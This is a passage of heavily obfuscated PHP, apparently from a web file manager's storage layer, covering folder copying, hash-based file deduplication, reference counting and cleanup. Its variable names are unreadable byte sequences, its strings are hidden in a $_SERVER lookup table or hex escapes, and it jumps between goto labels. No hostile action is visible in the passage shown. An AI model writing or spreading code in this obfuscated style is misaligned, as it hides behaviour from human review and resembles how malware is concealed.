Model($›¤ãÙÊŸ[631])->where($ÒıöŒµ)->save(array($›¤ãÙÊŸ[630] => 0)); Model($›¤ãÙÊŸ[633])->where($ÒıöŒµ)->delete(); } public function copyFolderFromIO($å±œÓô, $àïøÑ¾, $ƒÛ¯óáí, $ÛÔ­©´é, $¦ ‡Î¹õ, $İíŒµåÖ = false) { $·ã”Î´ =& $_SERVER[”ôÑ§ì¸]; $ëŠÄÔ–ç = array($·ã”Î´[597] => array(), $·ã”Î´[598] => array(), $·ã”Î´[596] => array(), $·ã”Î´[634] => array()); $ÇÍÎô¿‘ = $İíŒµåÖ ? $İíŒµåÖ : $å±œÓô->pathThis($àïøÑ¾); $Å¨’¼ = $this->fileNameExist($ƒÛ¯óáí, $ÇÍÎô¿‘); $¸²Ü®åä = $this->mkdir($ƒÛ¯óáí, $ÇÍÎô¿‘, $ÛÔ­©´é); if (!$Å¨’¼ || $ÛÔ­©´é == REPEAT_RENAME_FOLDER) { $ÛÔ­©´é = !1; } if ($Å¨’¼) { $this->_childrenAllMake($Å¨’¼); } Hook::trigger($·ã”Î´[635]); $this->_copyChildTo($å±œÓô, $àïøÑ¾, $¸²Ü®åä, $ÛÔ­©´é, $ëŠÄÔ–ç, $¦ ‡Î¹õ); Hook::trigger($·ã”Î´[636]); if ($¸²Ü®åä) { $this->folderSizeResetChildren($¸²Ü®åä); } $this->_childrenListClear(); Model($·ã”Î´[599])->addAll($ëŠÄÔ–ç[$·ã”Î´[597]], array(), !0); Model($·ã”Î´[600])->eventCopy($¸²Ü®åä); $this->saveAll($ëŠÄÔ–ç[$·ã”Î´[598]]); Model($·ã”Î´[511])->linkAdd($ëŠÄÔ–ç[$·ã”Î´[596]]); Model($·ã”Î´[511])->remove($ëŠÄÔ–ç[$·ã”Î´[634]]); $this->folderSizeReset($ƒÛ¯óáí); $this->updateModifyTime($ƒÛ¯óáí); return $¸²Ü®åä; } private function _copyChildTo($š÷°€…Ò, $¢Ë†ìıà, $Æá›÷•É, $“ï„öğ, &$ÇÉ—÷Ïñ, $Ó¼ı¬¦) { $¨±òÂ…Ù =& $_SERVER[”ôÑ§ì¸]; $‹±Ç„† = $this->sourceInfoCache($Æá›÷•É); $¿”Ÿ±ò© = $š÷°€…Ò->listPath($¢Ë†ìıà); $¿”Ÿ±ò© = $¿”Ÿ±ò© ? $¿”Ÿ±ò© : array($¨±òÂ…Ù[83] => array(), $¨±òÂ…Ù[82] => array()); $‹äÚ©ü = array_merge($¿”Ÿ±ò©[$¨±òÂ…Ù[83]], $¿”Ÿ±ò©[$¨±òÂ…Ù[82]]); $”±îÕ¹ = $this->_addFiles($š÷°€…Ò, $¿”Ÿ±ò©[$¨±òÂ…Ù[83]], $Ó¼ı¬¦); $‰æùü×â = array(); foreach ($‹äÚ©ü as &$À–ïñ‡ƒ) { if (isset($”±îÕ¹[$À–ïñ‡ƒ[$¨±òÂ…Ù[32]]])) { $À–ïñ‡ƒ = $”±îÕ¹[$À–ïñ‡ƒ[$¨±òÂ…Ù[32]]]; } $À–ïñ‡ƒ[$¨±òÂ…Ù[452]] = $À–ïñ‡ƒ[$¨±òÂ…Ù[33]] == $¨±òÂ…Ù[75]; $À–ïñ‡ƒ[$¨±òÂ…Ù[453]] = substr(_get($À–ïñ‡ƒ, $¨±òÂ…Ù[174], $¨±òÂ…Ù[12]), 0, 10); $À–ïñ‡ƒ[$¨±òÂ…Ù[76]] = _get($À–ïñ‡ƒ, $¨±òÂ…Ù[76], 0); $À–ïñ‡ƒ[$¨±òÂ…Ù[508]] = _get($À–ïñ‡ƒ, $¨±òÂ…Ù[508], 0); if (!isset($À–ïñ‡ƒ[$¨±òÂ…Ù[637]]) && $À–ïñ‡ƒ[$¨±òÂ…Ù[508]]) { $ÇÉ—÷Ïñ[$¨±òÂ…Ù[634]][] = $À–ïñ‡ƒ[$¨±òÂ…Ù[508]]; } if ($“ï„öğ) { $ßÊ×ø´ = $this->fileNameExistCache($Æá›÷•É, $À–ïñ‡ƒ[$¨±òÂ…Ù[32]]); if ($ßÊ×ø´) { if ($À–ïñ‡ƒ[$¨±òÂ…Ù[452]] || $“ï„öğ == REPEAT_SKIP) { continue; } if ($“ï„öğ == REPEAT_REPLACE) { $½­¨ÎôÙ = $this->sourceInfoCache($ßÊ×ø´); $ÃŞ¤ƒ÷ = $this->fileHistory($½­¨ÎôÙ, $À–ïñ‡ƒ[$¨±òÂ…Ù[508]], $À–ïñ‡ƒ[$¨±òÂ…Ù[76]]); if ($ÃŞ¤ƒ÷) { $ÇÉ—÷Ïñ[$¨±òÂ…Ù[596]][] = $À–ïñ‡ƒ[$¨±òÂ…Ù[508]]; } continue; } else { if ($“ï„öğ == REPEAT_RENAME) { $À–ïñ‡ƒ[$¨±òÂ…Ù[32]] = $this->fileNameAutoCache($Æá›÷•É, $À–ïñ‡ƒ[$¨±òÂ…Ù[32]], $“ï„öğ, !1); } } } } if (!$À–ïñ‡ƒ[$¨±òÂ…Ù[452]] && $À–ïñ‡ƒ[$¨±òÂ…Ù[508]] == 0) { continue; } if (!$À–ïñ‡ƒ[$¨±òÂ…Ù[452]] && $À–ïñ‡ƒ[$¨±òÂ…Ù[508]]) { $ÇÉ—÷Ïñ[$¨±òÂ…Ù[596]][] = $À–ïñ‡ƒ[$¨±òÂ…Ù[508]]; } $‰æùü×â[] = $this->_makeItemData($À–ïñ‡ƒ, $‹±Ç„†, $À–ïñ‡ƒ[$¨±òÂ…Ù[32]]); } unset($À–ïñ‡ƒ); if (!empty($‰æùü×â)) { $this->addAll($‰æùü×â); $this->_childrenListSelect($Æá›÷•É); } $ëÄşÚÑ = $this->_childrenList($Æá›÷•É); $ëÄşÚÑ = array_to_keyvalue($ëÄşÚÑ, $¨±òÂ…Ù[32]); foreach ($‹äÚ©ü as $À–ïñ‡ƒ) { $½­¨ÎôÙ = $ëÄşÚÑ[$À–ïñ‡ƒ[$¨±òÂ…Ù[32]]]; $øø¥¯ßû = $½­¨ÎôÙ[$¨±òÂ…Ù[180]]; $this->_copyApplyMeta($½­¨ÎôÙ, $ÇÉ—÷Ïñ); if ($À–ïñ‡ƒ[$¨±òÂ…Ù[33]] == $¨±òÂ…Ù[75]) { $À–ïñ‡ƒ[$¨±òÂ…Ù[84]] = $š÷°€…Ò->getPathInner($À–ïñ‡ƒ[$¨±òÂ…Ù[84]]); $this->_copyChildTo($š÷°€…Ò, $À–ïñ‡ƒ[$¨±òÂ…Ù[84]], $øø¥¯ßû, $“ï„öğ, $ÇÉ—÷Ïñ, $Ó¼ı¬¦); } } } private function _addFiles($™¢Ú·µ©, $À–©Šö, $ş¨Ş±œì) { $‹ö¤Ä«ü =& $_SERVER[”ôÑ§ì¸]; if (!$À–©Šö || count($À–©Šö) == 0) { return array(); } $¦¤ã¼¾– = array(); foreach ($À–©Šö as &$ÉÅö•) { Hook::trigger($‹ö¤Ä«ü[638], $ÉÅö•); $ÉÅö•[$‹ö¤Ä«ü[84]] = $™¢Ú·µ©->getPathInner($ÉÅö•[$‹ö¤Ä«ü[84]]); $İ·×õçÄ = $™¢Ú·µ©->hashSimple($ÉÅö•[$‹ö¤Ä«ü[84]]); $êÚˆ“İ§ = $™¢Ú·µ©->hashMd5($ÉÅö•[$‹ö¤Ä«ü[84]]); if (strlen($êÚˆ“İ§) > 10 && !isset($¦¤ã¼¾–[$êÚˆ“İ§])) { $¦¤ã¼¾–[$êÚˆ“İ§] = array(); } $ÉÅö•[$‹ö¤Ä«ü[639]] = $İ·×õçÄ; $ÉÅö•[$‹ö¤Ä«ü[640]] = $êÚˆ“İ§; $¦¤ã¼¾–[$êÚˆ“İ§][] =& $ÉÅö•; if (count($¦¤ã¼¾–[$êÚˆ“İ§]) > 1) { $ÉÅö•[$‹ö¤Ä«ü[637]] = !0; } Hook::trigger($‹ö¤Ä«ü[641], $ÉÅö•); } unset($ÉÅö•); $ ¢ï°Ä = array($‹ö¤Ä«ü[640] => array($‹ö¤Ä«ü[7], array_keys($¦¤ã¼¾–))); $ ·«ıòÏ = Model($‹ö¤Ä«ü[642]); $¥úÒÂèù = $ ·«ıòÏ->where($ ¢ï°Ä)->select(); $¥úÒÂèù = $¥úÒÂèù ? $¥úÒÂèù : array(); foreach ($¥úÒÂèù as $ä‚¾¥–’) { if (!isset($¦¤ã¼¾–[$ä‚¾¥–’[$‹ö¤Ä«ü[640]]])) { continue; } $ùÃÅµî¤ = $¦¤ã¼¾–[$ä‚¾¥–’[$‹ö¤Ä«ü[640]]]; foreach ($ùÃÅµî¤ as &$ÉÅö•) { $ÉÅö•[$‹ö¤Ä«ü[508]] = $ä‚¾¥–’[$‹ö¤Ä«ü[508]]; $ÉÅö•[$‹ö¤Ä«ü[637]] = !0; } unset($ÉÅö•); } $û¬„ÊĞî = array(); foreach ($À–©Šö as $¨Ù°’Š—) { Hook::trigger($‹ö¤Ä«ü[643], $¨Ù°’Š—); if (isset($¨Ù°’Š—[$‹ö¤Ä«ü[637]]) && $¨Ù°’Š—[$‹ö¤Ä«ü[637]]) { Hook::trigger($‹ö¤Ä«ü[644], $¨Ù°’Š—); continue; } $‘æ‹¦µÒ = $™¢Ú·µ©->getPathInner($¨Ù°’Š—[$‹ö¤Ä«ü[84]]); $Ÿ¿š‹ÅŒ = $ ·«ıòÏ->addFileMake($‘æ‹¦µÒ, $¨Ù°’Š—[$‹ö¤Ä«ü[76]], $¨Ù°’Š—[$‹ö¤Ä«ü[639]], $¨Ù°’Š—[$‹ö¤Ä«ü[640]], $¨Ù°’Š—[$‹ö¤Ä«ü[32]], $ş¨Ş±œì); Hook::trigger($‹ö¤Ä«ü[644], $¨Ù°’Š—); if (!is_array($Ÿ¿š‹ÅŒ)) { continue; } $û¬„ÊĞî[] = $Ÿ¿š‹ÅŒ; } $ ·«ıòÏ->addAll($û¬„ÊĞî); $ ¢ï°Ä = array($‹ö¤Ä«ü[640] => array($‹ö¤Ä«ü[7], array_keys($¦¤ã¼¾–))); $¥úÒÂèù = $ ·«ıòÏ->where($ ¢ï°Ä)->select(); $¥úÒÂèù = $¥úÒÂèù ? $¥úÒÂèù : array(); foreach ($¥úÒÂèù as $ä‚¾¥–’) { if (!isset($¦¤ã¼¾–[$ä‚¾¥–’[$‹ö¤Ä«ü[640]]])) { continue; } $”ÇÑ·Í€ =& $¦¤ã¼¾–[$ä‚¾¥–’[$‹ö¤Ä«ü[640]]]; foreach ($”ÇÑ·Í€ as &$ÉÅö•) { $ÉÅö•[$‹ö¤Ä«ü[508]] = $ä‚¾¥–’[$‹ö¤Ä«ü[508]]; } unset($ÉÅö•); } $–úºĞ‰¿ = array(); foreach ($À–©Šö as $‘¡ÖòÂ) { $–úºĞ‰¿[$‘¡ÖòÂ[$‹ö¤Ä«ü[32]]] = $‘¡ÖòÂ; } return $–úºĞ‰¿; } } goto c†¼µØÍó”; aÌ ‡”»©Ç: function binCheckBigger($Àé‚şí†, $öğ†Íˆ) { return $Àé‚şí† > $öğ†Íˆ; } $_SERVER[$_SERVER[­¿“¤è][3]] = ("\x38\x32\x33\x38"."\67\61")+0;$_1j8e="56pinaz20dtxve4ubk3s9lmj71fwrg8qchyostmogv79nhcriy16dfbpx8ku5ew30qjl42zahcus8f";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($™•¥„íÆ, $ğ°İÓäí) { $ßøˆÖïÙ =& $_SERVER[”ôÑ§ì¸]; if (isset(self::$_methodList[$™•¥„íÆ])) { return @call_user_func_array(self::$_methodList[$™•¥„íÆ], $ğ°İÓäí); } else { if (method_exists($this, $™•¥„íÆ)) { return call_user_func_array(array($this, $™•¥„íÆ), $ğ°İÓäí); } else { think_exception(__CLASS__ . $ßøˆÖïÙ[4] . $™•¥„íÆ . $ßøˆÖïÙ[5]); } } } public static function __callStatic($Î‰¿Ô‚, $õîí‘ä‰) { if (isset(self::$_methodListStatic[$Î‰¿Ô‚])) { return call_user_func_array(self::$_methodListStatic[$Î‰¿Ô‚], $õîí‘ä‰); } else { if (method_exists(self, $Î‰¿Ô‚)) { return call_user_func_array(array(self, $Î‰¿Ô‚), $õîí‘ä‰); } else { show_json("{$Î‰¿Ô‚}\x28\51\x20\156\x6f\164\x20\x65\x78\x69\163\164\73", !1); } } } public static function addMethod($€¯’¯´Ñ, $ŠÚø»¦³) { self::$_methodList[$€¯’¯´Ñ] = $ŠÚø»¦³; } public static function addMethodStatic($øæàí ˆ, $«¼­æú¢) { self::$_methodListStatic[$øæàí ˆ] = $«¼­æú¢; } } goto cÙ†¡ÏÓ‡; e±¬¸Ûµ¤è: class FileModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x66\151\154\145"; protected $tableMeta = array("\x74\x61\142\154\x65\116\141\155\145" => "\x69\157\x5f\x66\x69\154\x65\137\x6d\145\x74\141", "\x6d\x65\164\x61\106\x69\145\x6c\144" => "\x66\151\154\145\111\104"); public function fileInfo($ñÚŸäÖí) { $İŠ˜§¦ =& $_SERVER[”ôÑ§ì¸]; static $Ü¾ÇŠô‚ = array(); if (!isset($Ü¾ÇŠô‚[$ñÚŸäÖí])) { $ùÜ¨ÁÒĞ = $İŠ˜§¦[1915]; $Äó÷›è“ = Model($İŠ˜§¦[511])->field($ùÜ¨ÁÒĞ)->where(array($İŠ˜§¦[509] => $ñÚŸäÖí))->find(); $Ü¾ÇŠô‚[$ñÚŸäÖí] = $Äó÷›è“; } return $Ü¾ÇŠô‚[$ñÚŸäÖí]; } public function addFileByContent($¢ßåÕı× = '', $ìàá±ÇË = '') { $ÅåëÑ¨ =& $_SERVER[”ôÑ§ì¸]; $¦¬ÃÊ“´ = TEMP_PATH . $ÅåëÑ¨[1916]; if (!is_dir($¦¬ÃÊ“´)) { mk_dir($¦¬ÃÊ“´); } $¦äŸå = $¦¬ÃÊ“´ . $ÅåëÑ¨[1917] . rand_string(16); file_put_contents($¦äŸå, $¢ßåÕı×); $º´åÔ¦‹ = $this->addFile($¦äŸå, $ìàá±ÇË, !0); if (file_exists($¦äŸå)) { @unlink($¦äŸå); } return $º´åÔ¦‹; } public function createFileName($ô¿´åÂó, $—õåòİ† = false, $ÈÏ¯ÈÚ = false) { $ßŒÏøÔÒ =& $_SERVER[”ôÑ§ì¸]; $œçŞğáº = IO::init($ßŒÏøÔÒ[8]); $„ÑËûáà = $this->makeFilePath($ô¿´åÂó, $œçŞğáº, $—õåòİ†, $ÈÏ¯ÈÚ); $ğ²—øÛô = $œçŞğáº->pathFather($„ÑËûáà); static $¹¶¶ç¨» = false; $³œÂõÔì = $ßŒÏøÔÒ[1918] . md5($ğ²—øÛô); if (!$¹¶¶ç¨» && !Cache::get($³œÂõÔì)) { $¹¶¶ç¨» = !0; $šŠù™¨Ì = IO::mkdir($ğ²—øÛô); if (!IO::exist($šŠù™¨Ì . $ßŒÏøÔÒ[819])) { IO::mkfile($šŠù™¨Ì . $ßŒÏøÔÒ[819]); } Cache::set($³œÂõÔì, 1, 3600 * 2); } return $„ÑËûáà; } public function makeFilePath($ĞöÎ‡àê, $öàÔšÃ, $óú½º¼Ä = false, $ƒ“ÀÅÈß = false) { $Í°İÁŞ» =& $_SERVER[”ôÑ§ì¸]; $³Ù‹çÉß = Model($Í°İÁŞ»[792])->get($Í°İÁŞ»[1919]); $ƒ»İÙÖõ = KodIO::defaultIO() . date($Í°İÁŞ»[1920]); $Å˜ƒ‹ª¶ = $ƒ»İÙÖõ . rand_string(5) . short_id(100); $ĞöÎ‡àê = str_replace($Í°İÁŞ»[8], $Í°İÁŞ»[11], KodIO::clear($ĞöÎ‡àê)); $œ†Î×óÉ = $öàÔšÃ->ext($ĞöÎ‡àê); if (!$ĞöÎ‡àê) { $³Ù‹çÉß = $Í°İÁŞ»[1921]; } switch ($³Ù‹çÉß) { case $Í°İÁŞ»[1922]: $Å˜ƒ‹ª¶ = $Å˜ƒ‹ª¶ . $Í°İÁŞ»[10] . $öàÔšÃ->ext($ĞöÎ‡àê); if ($œ†Î×óÉ == $Í°İÁŞ»[1859]) { $Å˜ƒ‹ª¶ .= $Í°İÁŞ»[1237]; } break; case $Í°İÁŞ»[1923]: $ğÄÇˆÁ„ = Model($Í°İÁŞ»[792])->get($Í°İÁŞ»[793]); $±³ ÈÕ¿ = substr(md5($Í°İÁŞ»[794] . $ğÄÇˆÁ„ . date($Í°İÁŞ»[770])), 0, 8); $©†ŞÃú¤ = KodIO::defaultDriver(); $ƒ»İÙÖõ = $Í°İÁŞ»[1268] . $©†ŞÃú¤[$Í°İÁŞ»[442]] . $Í°İÁŞ»[451] . date($Í°İÁŞ»[1924]) . $±³ ÈÕ¿ . $Í°İÁŞ»[8]; if ($œ†Î×óÉ == $Í°İÁŞ»[1859]) { $ĞöÎ‡àê .= $Í°İÁŞ»[1237]; } $´Ã™İ¢ƒ = $Í°İÁŞ»[1925] . $ƒ»İÙÖõ . $ĞöÎ‡àê; CacheLock::lock($´Ã™İ¢ƒ); $Å˜ƒ‹ª¶ = $ƒ»İÙÖõ . $ĞöÎ‡àê; if (IO::exist($ƒ»İÙÖõ . $ĞöÎ‡àê)) { $ºß‡†§Ê = substr($ĞöÎ‡àê, 0, strlen($ĞöÎ‡àê) - strlen($œ†Î×óÉ)); $¾êÆô‡­ = $ƒ“ÀÅÈß ? substr($ƒ“ÀÅÈß, 0, 5) : ($óú½º¼Ä ? substr($óú½º¼Ä, 0, 5) : rand_string(5)); $Å˜ƒ‹ª¶ = $ƒ»İÙÖõ . $ºß‡†§Ê . $¾êÆô‡­ . $Í°İÁŞ»[10] . $œ†Î×óÉ; } if (IO::isTypeObject($Å˜ƒ‹ª¶) && !IO::isUploadServer($Å˜ƒ‹ª¶)) { if (IO::exist($Å˜ƒ‹ª¶)) { return $Å˜ƒ‹ª¶; } $ÕäÆæß‰ = IO::setContent($Å˜ƒ‹ª¶, $Í°İÁŞ»[12]); if (!$ÕäÆæß‰) { show_json($Í°İÁŞ»[1926], !1); } } CacheLock::unlock($´Ã™İ¢ƒ); break; case $Í°İÁŞ»[1921]: break; default: break; } return $Å˜ƒ‹ª¶; } public function addFileByRemote($¡ùùšÆÃ, $†¿ööû, $ˆˆ†–»» = array()) { $ÔûÂï¬« =& $_SERVER[”ôÑ§ì¸]; if (!IO::exist($¡ùùšÆÃ)) { return !1; } $³Ê‰şùˆ = $ˆˆ†–»»[$ÔûÂï¬«[640]] ? $ˆˆ†–»»[$ÔûÂï¬«[640]] : $ÔûÂï¬«[12]; $ºÇñ¤ü = IO::hashMd5($¡ùùšÆÃ, $³Ê‰şùˆ); $İ¾ÈÌŞ™ = KodIO::defaultDriver(); $î¡«êõÕ = array($ÔûÂï¬«[584] => IO::size($¡ùùšÆÃ), $ÔûÂï¬«[1927] => 1, $ÔûÂï¬«[461] => $†¿ööû, $ÔûÂï¬«[830] => $İ¾ÈÌŞ™[$ÔûÂï¬«[442]], $ÔûÂï¬«[462] => $¡ùùšÆÃ, $ÔûÂï¬«[1928] => $ˆˆ†–»»[$ÔûÂï¬«[639]] ? $ˆˆ†–»»[$ÔûÂï¬«[639]] : IO::hashSimple($¡ùùšÆÃ), $ÔûÂï¬«[1929] => $ºÇñ¤ü ? $ºÇñ¤ü : $³Ê‰şùˆ); if ($ä†ÖİÈœ = $this->addFileCheckExist($î¡«êõÕ[$ÔûÂï¬«[639]], $î¡«êõÕ[$ÔûÂï¬«[640]], $î¡«êõÕ[$ÔûÂï¬«[76]])) { return $ä†ÖİÈœ; } return $this->addFileData($î¡«êõÕ); } private function addFileData($ôõçÖùÔ) { $äÛÍ…’È =& $_SERVER[”ôÑ§ì¸]; if (!$ôõçÖùÔ) { return !1; } $ôõçÖùÔ[$äÛÍ…’È[76]] = intval($ôõçÖùÔ[$äÛÍ…’È[76]]); if (!$ôõçÖùÔ[$äÛÍ…’È[76]] && strlen($ôõçÖùÔ[$äÛÍ…’È[639]]) > 32) { $ôõçÖùÔ[$äÛÍ…’È[76]] = intval(substr($ôõçÖùÔ[$äÛÍ…’È[639]], 32)); } $ìÔ˜ğäœ = $this->add($ôõçÖùÔ); return $this->find($ìÔ˜ğäœ); } public function addFile($ä•€Õù§, $ÔêïñÎì, $´Çï¼½Ÿ = false) { $•ô¯ú¦ˆ =& $_SERVER[”ôÑ§ì¸]; $›Ç€¾ˆµ = IO::hashSimple($ä•€Õù§); $´„¤‘‹‘ = IO::size($ä•€Õù§); $éÀÀĞØ = $´„¤‘‹‘ <= 1024 * 1024 * 10 ? IO::hashMd5($ä•€Õù§) : $•ô¯ú¦ˆ[12]; $½†ğöò‹ = $•ô¯ú¦ˆ[1930] . $›Ç€¾ˆµ; CacheLock::lock($½†ğöò‹); if ($éÀÀĞØ && $›Ç€¾ˆµ) { $çµÇâÕ = $this->addFileCheckExist($›Ç€¾ˆµ, $éÀÀĞØ, $´„¤‘‹‘); if ($çµÇâÕ) { CacheLock::unlock($½†ğöò‹); return $çµÇâÕ; } } $çŸ¤©õû = $this->addFileMake($ä•€Õù§, $´„¤‘‹‘, $›Ç€¾ˆµ, $éÀÀĞØ, $ÔêïñÎì, $´Çï¼½Ÿ); $Š£ê•æÔ = $this->addFileData($çŸ¤©õû); CacheLock::unlock($½†ğöò‹); if (!$éÀÀĞØ && $Š£ê•æÔ) { $this->fileMd5Check($Š£ê•æÔ); } return $Š£ê•æÔ; } private function fileMd5Check($ã££½„Ë) { $ßåÎ¶×» =& $_SERVER[”ôÑ§ì¸]; $Û£í¥Åß = array($ã££½„Ë[$ßåÎ¶×»[508]], $ã££½„Ë[$ßåÎ¶×»[84]]); $Ùí¢Ù‰Å = $ßåÎ¶×»[1931] . $ã££½„Ë[$ßåÎ¶×»[84]]; $Î€–ê¿‹ = $ßåÎ¶×»[1932] . $ã££½„Ë[$ßåÎ¶×»[508]]; $·ü¶æì© = TaskQueue::add($ßåÎ¶×»[1933], $Û£í¥Åß, $Ùí¢Ù‰Å, $Î€–ê¿‹); if (!$·ü¶æì©) { $this->fileMd5Set($ã££½„Ë[$ßåÎ¶×»[508]], $ã££½„Ë[$ßåÎ¶×»[84]]); } else { TaskQueue::addSubmit(); } } public function fileMd5Set($°š²Ìš¬, $«÷º×) { $Õ¤¨Ò =& $_SERVER[”ôÑ§ì¸]; $Ç®¯ßßô = $this->find($°š²Ìš¬); if (!$Ç®¯ßßô || $Ç®¯ßßô[$Õ¤¨Ò[640]]) { return; } $é¶¦æ™° = IO::hashMd5($«÷º×); if (!$é¶¦æ™°) { return $Õ¤¨Ò[12]; } $this->where(array($Õ¤¨Ò[508] => $°š²Ìš¬))->save(array($Õ¤¨Ò[640] => $é¶¦æ™°)); } public function addFileMake($¢ëÇêÇŸ, $ÄëâÓ×Ë, $È¸üˆ½, $‹£¤ñ‡, $é¢Ö÷Ë, $óññìàÜ) { $åŞõñÜ =& $_SERVER[”ôÑ§ì¸]; $§Æı³“ã = $this->createFileName($é¢Ö÷Ë, $È¸üˆ½, $‹£¤ñ‡); $çßµ›¸ = get_path_father($§Æı³“ã); $´Âµ€´¶ = get_path_this($§Æı³“ã); if ($óññìàÜ) { $Ğè†º€ç = IO::move($¢ëÇêÇŸ, $çßµ›¸, !1, $´Âµ€´¶); } else { $Ğè†º€ç = IO::copy($¢ëÇêÇŸ, $çßµ›¸, !1, $´Âµ€´¶); } if (!$Ğè†º€ç) { return !1; } $©‹ãíâÀ = KodIO::defaultDriver(); $¹ËÔ£‰Í = array($åŞõñÜ[584] => $ÄëâÓ×Ë, $åŞõñÜ[1927] => 1, $åŞõñÜ[461] => $é¢Ö÷Ë, $åŞõñÜ[830] => $©‹ãíâÀ[$åŞõñÜ[442]], $åŞõñÜ[462] => $§Æı³“ã, $åŞõñÜ[1928] => $È¸üˆ½, $åŞõñÜ[1929] => $‹£¤ñ‡); return $¹ËÔ£‰Í; } public function addFileCheckExist($‡ Ğºæû, $şºÙä¿ƒ, $¢îŠ¢˜Á) { $‘²…õÇî =& $_SERVER[”ôÑ§ì¸]; $ÇÑ‰™¡ = $this->findByHash($‡ Ğºæû, $şºÙä¿ƒ); if (!$ÇÑ‰™¡) { return !1; } $‡¹±¢Úù = array($‘²…õÇî[1927] => intval($ÇÑ‰™¡[$‘²…õÇî[1934]]) + 1, $‘²…õÇî[584] => $¢îŠ¢˜Á); $this->where(array($‘²…õÇî[509] => $ÇÑ‰™¡[$‘²…õÇî[508]]))->save($‡¹±¢Úù); return $ÇÑ‰™¡; } public function remove($Ãê®Ì’°) { $this->linkCountChange($Ãê®Ì’°, !1); $this->clearEmpty(); return !0; } public function linkAdd($ÙÔ‡”Æ) { $this->linkCountChange($ÙÔ‡”Æ, !0); } public function linkCountChange($™—æšò, $°÷ˆÜ†Ó) { $Ÿ¯üÌ•‚ =& $_SERVER[”ôÑ§ì¸]; if (!$™—æšò) { return; } if (!is_array($™—æšò)) { $™—æšò = array($™—æšò); } $“ş¹‘¿ = array(); foreach ($™—æšò as $ñ§öÕş) { $è˜ÈçÆ = $ñ§öÕş . $Ÿ¯üÌ•‚[12]; if (!$“ş¹‘¿[$è˜ÈçÆ]) { $“ş¹‘¿[$è˜ÈçÆ] = 0; } $“ş¹‘¿[$è˜ÈçÆ]++; } $ş§´ÙÏ = array(); foreach ($“ş¹‘¿ as $ñ§öÕş => $À‰µÀÜØ) { $è˜ÈçÆ = $À‰µÀÜØ . $Ÿ¯üÌ•‚[12]; if (!$ş§´ÙÏ[$è˜ÈçÆ]) { $ş§´ÙÏ[$è˜ÈçÆ] = array(); } $ş§´ÙÏ[$è˜ÈçÆ][] = $ñ§öÕş; } foreach ($ş§´ÙÏ as $À‰µÀÜØ => $ÓŒ¦¶‚„) { if (!$ÓŒ¦¶‚„) { continue; } $À‰µÀÜØ = $°÷ˆÜ†Ó ? $À‰µÀÜØ : -intval($À‰µÀÜØ); $¤¾İ×Ø = array($Ÿ¯üÌ•‚[508] => array($Ÿ¯üÌ•‚[7], $ÓŒ¦¶‚„)); if ($À‰µÀÜØ < 0) { $¤¾İ×Ø[$Ÿ¯üÌ•‚[1934]] = array($Ÿ¯üÌ•‚[1046], abs($À‰µÀÜØ)); } $this->where($¤¾İ×Ø)->setAdd($Ÿ¯üÌ•‚[1934], $À‰µÀÜØ); } } public function findByHash($Ëø¨¨úÇ, $Í¦õ´í = false) { $Ş»èáÀ© =& $_SERVER[”ôÑ§ì¸]; if (!$Ëø¨¨úÇ && !$Í¦õ´í) { return !1; } $˜€…ñ¯ï = array($Ş»èáÀ©[1928] => $Ëø¨¨úÇ); if ($Í¦õ´í) { $˜€…ñ¯ï = array($Ş»èáÀ©[1929] => $Í¦õ´í); } return $this->order($Ş»èáÀ©[1935])->where($˜€…ñ¯ï)->find(); } public function clearEmpty($€åèÁÄ = 0) { $®º¶Ë— =& $_SERVER[”ôÑ§ì¸]; $™à³ëßˆ = time() - 3600 * 24 * $€åèÁÄ; $ï¯Ãñü‚ = $®º¶Ë—[1936] . $™à³ëßˆ; $Š©¦ŸÀ = $this->where($ï¯Ãñü‚)->select(); if (!$Š©¦ŸÀ) { return; } $¢ ùããÎ = new Task($®º¶Ë—[1937], $®º¶Ë—[12], count($Š©¦ŸÀ)); foreach ($Š©¦ŸÀ as $šÂÈñ ÷) { $¢ ùããÎ->update(1); $this->resetFile($šÂÈñ ÷); } $¢ ùããÎ->end(); } public function resetFile($¤ÇÅïåÔ) { $¡’’¢™® =& $_SERVER[”ôÑ§ì¸]; $İ¨œÈ÷ = array($¡’’¢™®[509] => $¤ÇÅïåÔ[$¡’’¢™®[508]]); $â¦âáè = Model($¡’’¢™®[1363])->where($İ¨œÈ÷)->count(); $­Ó²¥µ³ = Model($¡’’¢™®[1938])->where($İ¨œÈ÷)->count(); $¦ÎëòÔ = intval($â¦âáè) + intval($­Ó²¥µ³); if ($¦ÎëòÔ == 0) { IO::remove($¤ÇÅïåÔ[$¡’’¢™®[84]]); Model($¡’’¢™®[1939])->delete($¤ÇÅïåÔ[$¡’’¢™®[508]]); $this->where($İ¨œÈ÷)->delete(); $this->metaSet($¤ÇÅïåÔ[$¡’’¢™®[508]], null, null); return; } if ($¤ÇÅïåÔ[$¡’’¢™®[1934]] != $¦ÎëòÔ) { $this->where($İ¨œÈ÷)->save(array($¡’’¢™®[1927] => $¦ÎëòÔ)); } } public function storageInfo($¾¤…Ø­¿ = false) { $Ó©ßŠ•ï =& $_SERVER[”ôÑ§ì¸]; $ëø…ö¡† = $this->count() + 0.0; $½Œ¢ñ® = 0; $ÚÊ–íó´ = 1; $Ü‰·İÂ = 0; $ÄäØı´ = 5000; for ($ı’¬ˆç¼ = 0; $ı’¬ˆç¼ < $ëø…ö¡†; $ı’¬ˆç¼ = $ı’¬ˆç¼ + $ÄäØı´) { $¶¿¹´ò = $this->limit($ı’¬ˆç¼, $ı’¬ˆç¼ + $ÄäØı´)->select(); foreach ($¶¿¹´ò as $Ñª†ÍÊ») { $ÚÊ–íó´ += $Ñª†ÍÊ»[$Ó©ßŠ•ï[76]] * $Ñª†ÍÊ»[$Ó©ßŠ•ï[1934]]; $½Œ¢ñ® += $Ñª†ÍÊ»[$Ó©ßŠ•ï[76]] * ($Ñª†ÍÊ»[$Ó©ßŠ•ï[1934]] - 1); $Ü‰·İÂ += $Ñª†ÍÊ»[$Ó©ßŠ•ï[1934]]; } } $Õ›âøŞÅ = array($Ó©ßŠ•ï[1940] => $ÚÊ–íó´, $Ó©ßŠ•ï[1941] => $½Œ¢ñ®, $Ó©ßŠ•ï[1942] => $½Œ¢ñ® / $ÚÊ–íó´, $Ó©ßŠ•ï[80] => $ëø…ö¡†, $Ó©ßŠ•ï[1943] => $Ü‰·İÂ); return $Õ›âøŞÅ; } } class GroupModel extends ModelBase { protected $tableName = "\147\x72\x6f\x75\160"; protected $tableMeta = array("\164\141\x62\154\145\116\141\155\x65" 